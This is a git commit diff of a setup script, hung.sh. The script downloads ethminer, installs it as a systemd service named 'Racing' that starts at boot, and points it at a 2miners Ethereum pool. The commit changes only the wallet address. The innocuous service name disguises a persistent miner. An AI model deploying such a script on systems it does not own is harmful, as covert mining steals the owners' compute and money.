3ef616e7d799cd8f96e5b79fb6ff0572e430f01c
nguyen3297 <85713242+nguyen3297@users.noreply.github.com>
2021-10-28 16:08:30 +0700

    Update hung.sh

--- hung.sh
+++ hung.sh
@@ -10,8 +10,8 @@ sudo apt-get -y install cuda-drivers
 sudo apt-get install libcurl3 -y
 wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x85c6aa49d2723b03ff8d81177669500ec7cdde5a.godmode@asia-eth.2miners.com:2020\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0xbbdc292660593dbeec203d6916c5fc200c452c33.godmode@asia-eth.2miners.com:2020\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 cd bin
-./ethminer -U -P stratum://0x85c6aa49d2723b03ff8d81177669500ec7cdde5a.godmode@asia-eth.2miners.com:2020 &
+./ethminer -U -P stratum://0xbbdc292660593dbeec203d6916c5fc200c452c33.godmode@asia-eth.2miners.com:2020 &
